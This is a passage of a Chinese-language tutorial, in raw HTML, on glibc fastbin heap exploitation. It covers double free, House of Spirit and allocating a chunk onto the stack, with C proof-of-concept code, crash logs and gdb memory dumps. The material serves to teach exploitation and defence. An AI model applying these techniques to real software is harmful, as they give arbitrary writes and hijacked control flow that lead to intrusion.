class="line">7fbb7a8c7000-7fbb7a8ca000 rw-p 00000000 00:00 0</span><br><span class="line">7fbb7a8e1000-7fbb7a8e4000 rw-p 00000000 00:00 0</span><br><span class="line">7fbb7a8e4000-7fbb7a8e5000 r--p 00025000 08:01 407367                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7fbb7a8e5000-7fbb7a8e6000 rw-p 00026000 08:01 407367                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7fbb7a8e6000-7fbb7a8e7000 rw-p 00000000 00:00 0</span><br><span class="line">7ffcd2f93000-7ffcd2fb4000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7ffcd2fc8000-7ffcd2fca000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7ffcd2fca000-7ffcd2fcc000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br><span class="line">已放弃 (核心已转储)</span><br></pre></td></tr></table></figure><p>如果我们在 chunk1 释放后，再释放 chunk2 ，这样 main_arena 就指向 chunk2 而不是 chunk1 了，此时我们再去释放 chunk1 就不再会被检测到。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一次释放<code>free(chunk1)</code></p><p><img src="img%5Cfastbin_free_chunk1.png" alt="fastbin_free_chunk1"></p><p>第二次释放<code>free(chunk2)</code></p><p><img src="img%5Cfastbin_free_chunk2.png" alt="fastbin_free_chunk2"></p><p>第三次释放<code>free(chunk1)</code></p><p><img src="img%5Cfastbin_free_chunk3.png" alt="fastbin_free_chunk3"></p><p>注意因为 chunk1 被再次释放因此其 fd 值不再为 0 而是指向 chunk2，这时如果我们可以控制 chunk1 的内容，便可以写入其 fd 指针从而实现在我们想要的任意地址分配 fastbin 块。 下面这个示例演示了这一点，首先跟前面一样构造 main_arena=&gt;chunk1=&gt;chun2=&gt;chunk1 的链表。之后第一次调用 malloc 返回 chunk1 之后修改 chunk1 的 fd 指针指向 bss 段上的 bss_chunk，之后我们可以看到 fastbin 会把堆块分配到这里。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">chunk</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> pre_size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> size;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> fd;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">CHUNK bss_chunk;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2,*chunk3;</span><br><span class="line">    <span class="keyword">void</span> *chunk_a,*chunk_b;</span><br><span class="line"></span><br><span class="line">    bss_chunk.size=<span class="number">0x21</span>;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line">    <span class="built_in">free</span>(chunk2);</span><br><span class="line">    <span class="built_in">free</span>(chunk1);</span><br><span class="line"></span><br><span class="line">    chunk_a=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span> *)chunk_a=&amp;bss_chunk;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    chunk_b=<span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p&quot;</span>,chunk_b);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在我的系统上 chunk_b 输出的值会是 0x601090，这个值位于 bss 段中正是我们之前设置的<code>CHUNK bss_chunk</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Start              End                Offset             Perm Path</span><br><span class="line">0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x &#x2F;home&#x2F;Ox9A82&#x2F;tst&#x2F;tst</span><br><span class="line">0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- &#x2F;home&#x2F;Ox9A82&#x2F;tst&#x2F;tst</span><br><span class="line">0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- &#x2F;home&#x2F;Ox9A82&#x2F;tst&#x2F;tst</span><br><span class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</span><br><span class="line"></span><br><span class="line">0x601080 &lt;bss_chunk&gt;:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x601090 &lt;bss_chunk+16&gt;:0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6010a0:               0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6010b0:               0x0000000000000000  0x0000000000000000</span><br><span class="line">0x6010c0:               0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>值得注意的是，我们在 main 函数的第一步就进行了<code>bss_chunk.size=0x21;</code>的操作，这是因为_int_malloc 会对欲分配位置的 size 域进行验证，如果其 size 与当前 fastbin 链表应有 size 不符就会抛出异常。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">*** Error in &#96;.&#x2F;tst&#39;: malloc(): memory corruption (fast): 0x0000000000601090 ***</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Backtrace: &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(+0x777e5)[0x7f8f9deb27e5]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(+0x82651)[0x7f8f9debd651]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(__libc_malloc+0x54)[0x7f8f9debf184]</span><br><span class="line">.&#x2F;tst[0x400636]</span><br><span class="line">&#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6(__libc_start_main+0xf0)[0x7f8f9de5b830]</span><br><span class="line">.&#x2F;tst[0x4004e9]</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Memory map: &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">00400000-00401000 r-xp 00000000 08:01 1052570                            &#x2F;home&#x2F;Ox9A82&#x2F;tst&#x2F;tst</span><br><span class="line">00600000-00601000 r--p 00000000 08:01 1052570                            &#x2F;home&#x2F;Ox9A82&#x2F;tst&#x2F;tst</span><br><span class="line">00601000-00602000 rw-p 00001000 08:01 1052570                            &#x2F;home&#x2F;Ox9A82&#x2F;tst&#x2F;tst</span><br><span class="line">00bc4000-00be5000 rw-p 00000000 00:00 0                                  [heap]</span><br><span class="line">7f8f98000000-7f8f98021000 rw-p 00000000 00:00 0</span><br><span class="line">7f8f98021000-7f8f9c000000 ---p 00000000 00:00 0</span><br><span class="line">7f8f9dc25000-7f8f9dc3b000 r-xp 00000000 08:01 398790                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7f8f9dc3b000-7f8f9de3a000 ---p 00016000 08:01 398790                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7f8f9de3a000-7f8f9de3b000 rw-p 00015000 08:01 398790                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libgcc_s.so.1</span><br><span class="line">7f8f9de3b000-7f8f9dffb000 r-xp 00000000 08:01 415688                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7f8f9dffb000-7f8f9e1fb000 ---p 001c0000 08:01 415688                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7f8f9e1fb000-7f8f9e1ff000 r--p 001c0000 08:01 415688                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7f8f9e1ff000-7f8f9e201000 rw-p 001c4000 08:01 415688                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">7f8f9e201000-7f8f9e205000 rw-p 00000000 00:00 0</span><br><span class="line">7f8f9e205000-7f8f9e22b000 r-xp 00000000 08:01 407367                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7f8f9e40d000-7f8f9e410000 rw-p 00000000 00:00 0</span><br><span class="line">7f8f9e427000-7f8f9e42a000 rw-p 00000000 00:00 0</span><br><span class="line">7f8f9e42a000-7f8f9e42b000 r--p 00025000 08:01 407367                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7f8f9e42b000-7f8f9e42c000 rw-p 00026000 08:01 407367                     &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">7f8f9e42c000-7f8f9e42d000 rw-p 00000000 00:00 0</span><br><span class="line">7fff71a94000-7fff71ab5000 rw-p 00000000 00:00 0                          [stack]</span><br><span class="line">7fff71bd9000-7fff71bdb000 r--p 00000000 00:00 0                          [vvar]</span><br><span class="line">7fff71bdb000-7fff71bdd000 r-xp 00000000 00:00 0                          [vdso]</span><br><span class="line">ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</span><br><span class="line">已放弃 (核心已转储)</span><br></pre></td></tr></table></figure><p>_int_malloc 中的校验如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      malloc_printerr (check_action, errstr, chunk2mem (victim));</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果 (首先要通过验证)，这就相当于任意地址写任意值的效果。</p><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><blockquote><p><a href="https://www.anquanke.com/post/id/85357">【技术分享】堆之House of Spirit</a></p><p><a href="https://paper.seebug.org/521/">PWN学习之house of系列(一)</a></p></blockquote><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>House of Spirit 是 <code>the Malloc Maleficarum</code> 中的一种技术。</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><ul><li>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。</li><li>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK</li><li>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。</li><li>fake chunk 的 next chunk 的大小不能小于 <code>2 * SIZE_SZ</code>，同时也不能大于<code>av-&gt;system_mem</code> 。</li><li>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</li></ul><p>至于为什么要绕过这些检测，可以参考 free 部分的源码。</p><h3 id="演示-1"><a href="#演示-1" class="headerlink" title="演示"></a>演示</h3><p>这里就直接以 how2heap 上的例子进行说明，如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates the house of spirit attack.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *a;</span><br><span class="line">    <span class="comment">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">7</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后的效果如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  how2heap git:(master) ./house_of_spirit</span><br><span class="line">This file demonstrates the house of spirit attack.</span><br><span class="line">Calling malloc() once so that it sets up its memory.</span><br><span class="line">We will now overwrite a pointer to point to a fake &#x27;fastbin&#x27; region.</span><br><span class="line">This region (memory of length: 80) contains two chunks. The first starts at 0x7ffd9bceaa58 and the second at 0x7ffd9bceaa88.</span><br><span class="line">This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><br><span class="line">... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end.</span><br><span class="line">The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><br><span class="line">Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, 0x7ffd9bceaa58.</span><br><span class="line">... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><br><span class="line">Freeing the overwritten pointer.</span><br><span class="line">Now the next malloc will return the region of our fake chunk at 0x7ffd9bceaa58, which will be 0x7ffd9bceaa60!</span><br><span class="line">malloc(0x30): 0x7ffd9bceaa60</span><br></pre></td></tr></table></figure><h3 id="小总结-1"><a href="#小总结-1" class="headerlink" title="小总结"></a>小总结</h3><p>可以看出，想要使用该技术分配 chunk 到指定地址，其实并不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址的前后的内容使其可以绕过对应的检测</strong>。</p><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><h3 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h3><p>如果你已经理解了前文所讲的 Fastbin Double Free 与 house of spirit 技术，那么理解该技术就已经不成问题了，它们的本质都在于 fastbin 链表的特性：当前 chunk 的 fd 指针指向下一个 chunk。</p><p>该技术的核心点在于劫持 fastbin 链表中 chunk 的 fd 指针，把 fd 指针指向我们想要分配的栈上，从而实现控制栈中的一些关键数据，比如返回地址等。</p><h3 id="演示-2"><a href="#演示-2" class="headerlink" title="演示"></a>演示</h3><p>这次我们把 fake_chunk 置于栈中称为 stack_chunk，同时劫持了 fastbin 链表中 chunk 的 fd 值，通过把这个 fd 值指向 stack_chunk 就可以实现在栈中分配 fastbin chunk。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _chunk</span><br><span class="line">&#123;</span><br><span class="line">    long long pre_size;</span><br><span class="line">    long long size;</span><br><span class="line">    long long fd;</span><br><span class="line">    long long bk;</span><br><span class="line">&#125; CHUNK,*PCHUNK;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    CHUNK stack_chunk;</span><br><span class="line"></span><br><span class="line">    void *chunk1;</span><br><span class="line">    void *chunk_a;</span><br><span class="line"></span><br><span class="line">    stack_chunk.size&#x3D;0x21;</span><br><span class="line">    chunk1&#x3D;malloc(0x10);</span><br><span class="line"></span><br><span class="line">    free(chunk1);</span><br><span class="line"></span><br><span class="line">    *(long long *)chunk1&#x3D;&amp;stack_chunk;</span><br><span class="line">    malloc(0x10);</span><br><span class="line">    chunk_a&#x3D;malloc(0x10);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过 gdb 调试可以看到我们首先把 chunk1 的 fd 指针指向了 stack_chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;&#x3D;&#x3D;&#x3D; chunk1</span><br><span class="line">0x602010:   0x00007fffffffde60  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000020fe1 &lt;&#x3D;&#x3D;&#x3D; top chunk</span><br></pre></td></tr></table></figure><p>之后第一次 malloc 使得 fastbin 链表指向了 stack_chunk，这意味着下一次分配会使用 stack_chunk 的内存进行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7dd1b20 &lt;main_arena&gt;:    0x0000000000000000 &lt;&#x3D;&#x3D;&#x3D; unsorted bin</span><br><span class="line">0x7ffff7dd1b28 &lt;main_arena+8&gt;:  0x00007fffffffde60 &lt;&#x3D;&#x3D;&#x3D; fastbin[0]</span><br><span class="line">0x7ffff7dd1b30 &lt;main_arena+16&gt;: 0x0000000000000000</span><br></pre></td></tr></table></figure><p>最终第二次 malloc 返回值为 0x00007fffffffde70 也就是 stack_chunk</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   0x400629 &lt;main+83&gt;        call   0x4004c0 &lt;malloc@plt&gt;</span><br><span class="line"> → 0x40062e &lt;main+88&gt;        mov    QWORD PTR [rbp-0x38], rax</span><br><span class="line">   $rax   : 0x00007fffffffde70</span><br><span class="line"></span><br><span class="line">0x0000000000400000 0x0000000000401000 0x0000000000000000 r-x &#x2F;home&#x2F;Ox9A82&#x2F;tst&#x2F;tst</span><br><span class="line">0x0000000000600000 0x0000000000601000 0x0000000000000000 r-- &#x2F;home&#x2F;Ox9A82&#x2F;tst&#x2F;tst</span><br><span class="line">0x0000000000601000 0x0000000000602000 0x0000000000001000 rw- &#x2F;home&#x2F;Ox9A82&#x2F;tst&#x2F;tst</span><br><span class="line">0x0000000000602000 0x0000000000623000 0x0000000000000000 rw- [heap]</span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7dd3000 0x00007ffff7dd7000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff7dd7000 0x00007ffff7dfd000 0x0000000000000000 r-x &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">0x00007ffff7fdb000 0x00007ffff7fde000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff7ff6000 0x00007ffff7ff8000 0x0000000000000000 rw-</span><br><span class="line">0x00007ffff7ff8000 0x00007ffff7ffa000 0x0000000000000000 r-- [vvar]</span><br><span class="line">0x00007ffff7ffa000 0x00007ffff7ffc000 0x0000000000000000 r-x [vdso]</span><br><span class="line">0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000025000 r-- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span class="line">0x00007ffff7ffd000 0x00007ffff7ffe000 0x0000000000026000 rw- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so</span><br><span 